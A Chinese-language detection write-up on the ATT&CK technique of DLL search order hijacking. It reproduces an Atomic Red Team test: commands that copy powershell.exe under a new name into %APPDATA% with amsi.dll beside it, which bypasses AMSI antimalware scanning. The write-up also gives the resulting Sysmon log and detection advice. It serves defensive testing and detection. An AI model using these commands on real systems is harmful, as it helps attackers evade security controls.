# T1574-001-win-劫持执行流程-DLL搜索顺序劫持
## 来自ATT&CK描述

攻击者可以通过劫持用于加载DLL的搜索顺序来执行自己的恶意负载。Windows系统使用一种常用方法来查找所需的DLL以加载到程序中。劫持DLL加载可能是为了建立持久化或者权限提升以及规避文件执行的限制。

攻击者可以通过多种方式劫持DLL加载。攻击者可能会在一个目录中植入木马动态链接库文件 (DLL)，该目录将在程序请求的合法库的位置之前进行搜索，导致 Windows在受害者程序调用其恶意库时加载其恶意库。攻击者还可以执行DLL预加载，也称为二进制植入攻击是将与模糊指定的DLL同名的恶意DLL放置在Windows在合法DLL之前搜索的位置。这个位置通常是程序的当前工作目录。当程序在加载DLL之前将其当前目录设置为远程位置（例如 Web 共享）时，就会发生远程DLL预加载攻击。

攻击者也可能通过DLL重定向直接修改搜索顺序，在启用后（在注册表中并创建重定向文件）可能会导致程序加载不同的DLL。

如果搜索顺序易受攻击的程序配置为在更高权限级别运行，则加载的攻击者控制的 DLL也将在更高级别执行。在这种情况下，该技术可用于从用户到管理员或SYSTEM或从管理员到SYSTEM的权限升级，具体取决于程序。成为路径劫持受害者的程序可能表现正常，因为恶意DLL可能被配置为也加载它们打算替换的合法DLL。

## 测试案例

### 测试1 DLL Search Order Hijacking - amsi.dll

攻击者可以利用PowerShell不安全的库加载，加载amsi.dll的脆弱版本，以绕过AMSI（反恶意软件扫描接口）https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/

成功执行后，powershell.exe将被复制并重命名为updater.exe，并从一个非标准路径加载amsi.dll。

攻击命令，用命令提示符运行，需要权限提升，admin/root权限：
```
copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
%APPDATA%\updater.exe -Command exit
```

清除命令：
```
del %APPDATA%\updater.exe >nul 2>&1
del %APPDATA%\amsi.dll >nul 2>&1
```

## 检测日志

Windows Sysmon日志

## 测试复现
### 测试1 DLL Search Order Hijacking - amsi.dll
```
Microsoft Windows [版本 10.0.17763.973]
(c) 2018 Microsoft Corporation。保留所有权利。

C:\Users\Administrator.ZHULI>copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
已复制         1 个文件。

C:\Users\Administrator.ZHULI>copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
已复制         1 个文件。

C:\Users\Administrator.ZHULI>%APPDATA%\updater.exe -Command exit

C:\Users\Administrator.ZHULI>del %APPDATA%\updater.exe >nul 2>&1

C:\Users\Administrator.ZHULI>del %APPDATA%\amsi.dll >nul 2>&1

C:\Users\Administrator.ZHULI>
```


## 测试留痕
### 测试1 DLL Search Order Hijacking - amsi.dll
Windows sysmon日志
```事件ID:7
      

Image loaded:

RuleName: technique_id=T1059.001,technique_name=PowerShell

UtcTime: 2022-01-13 08:49:39.694

ProcessGuid: {78c84c47-e7a3-61df-9a02-000000000900}

ProcessId: 1044

Image: C:\Users\Administrator.ZHULI\AppData\Roaming\updater.exe

ImageLoaded: C:\Users\Administrator.ZHULI\AppData\Roaming\amsi.dll

FileVersion: 10.0.17763.1 (WinBuild.160101.0800)

Description: Anti-Malware Scan Interface

Product: Microsoft® Operating System

Company: Microsoft Corporation

OriginalFileName: amsi.dll

Hashes: SHA1=B7B7398DB0EDCE2C39A964096B009F60C544DC29,MD5=21EAA9941DB9CA4B41A5FFCBFE4CA9A5,SHA256=F675D2A8686A7CFD7A7056AC490E159A17D6B728420CF15C4EE26C670437370A,IMPHASH=11E9179F7B8A676A1110DA8E334D75BE

Signed: true

Signature: Microsoft Windows

SignatureStatus: Valid

User: ZHULI\Administrator
```

## 检测规则/思路
### 建议

监视文件系统，移动、重命名、替换或修改DLL行为。与已知软件、补丁等不相关的进程加载的DLL集的更改（与过去的行为相比）是可疑的。监控加载到进程中DLL，检测文件名相同但路径异常的DLL。对与软件更新无关的文件的修改、创建`.manifest`和`.local`重定向是可疑的。

## 参考推荐

MITRE-ATT&CK-T1574-001

<https://attack.mitre.org/techniques/T1574/001>

Atomic-red-team-T1574-001

<https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.md>
